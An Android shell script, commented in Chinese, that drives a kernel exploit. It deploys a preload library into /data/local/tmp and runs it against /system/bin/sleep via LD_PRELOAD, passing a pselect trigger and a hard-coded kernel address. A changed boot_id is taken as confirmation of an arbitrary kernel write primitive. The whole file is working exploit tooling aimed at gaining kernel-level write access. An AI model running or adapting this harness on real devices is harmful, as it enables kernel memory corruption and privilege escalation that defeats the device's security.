#!/system/bin/sh
# mt20: v37 立即 stamp + SLIDE 假锁 + boot_id 写目标 (无 shift 扫描 — stamp 偏移 v37 已校准)
# 若 boot_id 变化 = 写原语实证成功!
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt20.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt20_bootid.txt
RUNLOG=/data/local/tmp/mt20_run.out

echo "=== [1/4] 部署 ==="
rm -f $DST; cp $SRC $DST; sync
[ "$(sha256sum $SRC | awk '{print $1}')" = "$(sha256sum $DST | awk '{print $1}')" ] || { echo HASH_MISMATCH; exit 1; }
echo "HASH OK"
am kill-all 2>&1 | tail -1
BID0=$(cat /proc/sys/kernel/random/boot_id)
echo "boot_before=$BID0" > $LOG
echo "=== [2/4] 3 次尝试 (boot_id-8 写目标) ==="
for ATT in 1 2 3; do
  echo "--- attempt $ATT $(date +%H:%M:%S)" >> $LOG
  rm -f $RUNLOG
  timeout 140 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_TREE_PC=ffffff80028a77c8 \
    PSELECT_TREE_LEFT=0 \
    PSELECT_SKIP_WARMUP=1 \
    LD_PRELOAD=$DST /system/bin/sleep 100 > $RUNLOG 2>&1
  echo "attempt=$ATT rc=$?" >> $LOG
  grep -a 'mt20: stamp\|mt19b: sched\|SLIDE page\|bad leaked\|stext=\|collision finding failed\|leak retry' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
  BID=$(cat /proc/sys/kernel/random/boot_id)
  echo "attempt=$ATT boot_id=$BID" >> $LOG
  if [ "$BID" != "$BID0" ]; then
    echo "★★★ WRITE PRIMITIVE CONFIRMED on attempt $ATT ★★★" >> $LOG
    break
  fi
done
echo "=== [3/4] boot_id 后 ==="
echo "boot_after=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
echo "=== DONE ===" >> $LOG
